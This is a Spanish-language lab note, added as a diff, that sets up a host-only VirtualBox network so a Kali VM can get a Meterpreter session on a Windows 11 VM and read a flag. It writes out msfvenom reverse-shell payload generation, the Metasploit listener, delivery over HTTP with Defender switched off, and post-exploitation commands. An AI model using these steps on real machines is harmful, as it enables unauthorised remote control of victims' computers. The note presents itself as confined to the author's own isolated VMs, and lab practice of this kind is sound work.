@@ -1,0 +1,79 @@
+===============================================================================
+ GUION QUE SIGUE - PRUEBA 3 (retomar aqui)
+===============================================================================
+OBJETIVO PENDIENTE: conseguir la sesion Meterpreter y leer la flag en la VM Windows.
+BLOQUEO ACTUAL   : el retorno TCP VM->host no llega en modo BRIDGED porque el host
+                   tiene dos IPs en la misma subred (192.168.1.20 cable + .19 wifi).
+
+SOLUCION RECOMENDADA: montar una red HOST-ONLY y hacer el ataque ENTRE DOS VMs
+(Kali atacante -> Windows victima). Asi no interviene el doble IP del host y el
+retorno TCP siempre llega. Es el montaje tipico de los labs estilo HTB.
+
+  [ KALI (atacante) ] --- red Host-Only 192.168.56.x --- [ WINDOWS 11 (victima) ]
+
+-------------------------------------------------------------------------------
+TAREA 3.1 - Crear la red Host-Only (una sola vez)
+-------------------------------------------------------------------------------
+VirtualBox (ventana principal) -> File -> Tools -> Network Manager
+  -> pestana "Host-only Networks" -> Create
+  -> se crea vboxnet0, IP del host tipo 192.168.56.1, DHCP activado.
+  -> anotar la IP del host en esa red (normalmente 192.168.56.1).
+
+-------------------------------------------------------------------------------
+TAREA 3.2 - Anadir adaptador Host-Only a las VMs
+-------------------------------------------------------------------------------
+Con las VMs apagadas:
+  - Windows11 -> Settings -> Network -> Adapter 2 -> Enable
+      Attached to: Host-only Adapter -> vboxnet0
+      (dejar Adapter 1 en bridge para que siga teniendo internet)
+  - Kali -> igual: Adapter 2 -> Host-only Adapter -> vboxnet0
+Arrancar ambas y ver las IPs 192.168.56.x:
+  - Windows: ipconfig
+  - Kali:    ip a
+
+-------------------------------------------------------------------------------
+TAREA 3.3 - Regenerar el payload con la IP nueva (en Kali)
+-------------------------------------------------------------------------------
+El LHOST cambia a la IP de Kali en 192.168.56.x (p.ej. 192.168.56.101):
+  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP_KALI_56> LPORT=4444 -f exe -o trampa2.exe
+
+-------------------------------------------------------------------------------
+TAREA 3.4 - Listener con la IP nueva (en Kali)
+-------------------------------------------------------------------------------
+  msfconsole
+  use exploit/multi/handler
+  set PAYLOAD windows/x64/meterpreter/reverse_tcp
+  set LHOST <IP_KALI_56>
+  set LPORT 4444
+  run
+  -> debe decir: Started reverse TCP handler on <IP_KALI_56>:4444
+
+-------------------------------------------------------------------------------
+TAREA 3.5 - Entregar y ejecutar
+-------------------------------------------------------------------------------
+  - En Kali:  cd ~ && python3 -m http.server 8000
+  - En Windows: curl http://<IP_KALI_56>:8000/trampa2.exe -o trampa2.exe
+  - Desactivar Proteccion en tiempo real de Defender JUSTO antes.
+  - Ejecutar trampa2.exe UNA sola vez (con el listener activo).
+
+CHECK previo util:  Test-NetConnection <IP_KALI_56> -Port 4444  (debe dar True)
+
+-------------------------------------------------------------------------------
+TAREA 3.6 - Post-explotacion (cuando caiga "meterpreter >")
+-------------------------------------------------------------------------------
+  getuid              -> con que usuario estamos
+  sysinfo             -> info del sistema
+  pwd / ls / cd       -> navegar el disco
+  search -f flag.txt  -> buscar la flag
+  cat <ruta>\flag.txt -> leer la flag (objetivo del reto)
+  shell               -> consola nativa de Windows (opcional)
+
+-------------------------------------------------------------------------------
+NOTAS / ALTERNATIVAS
+-------------------------------------------------------------------------------
+- Si se quiere seguir con BRIDGED en vez de Host-Only: desactivar temporalmente el
+  wifi del host (dejar solo la IP .20 del cable) para quitar el doble IP, y reintentar.
+- Instalar Guest Additions en la Windows arregla cursor, pantalla completa y permite
+  carpetas compartidas (transferencia sin red).
+- Recordar: todo esto solo sobre maquinas propias y aisladas. Fin educativo.
+===============================================================================
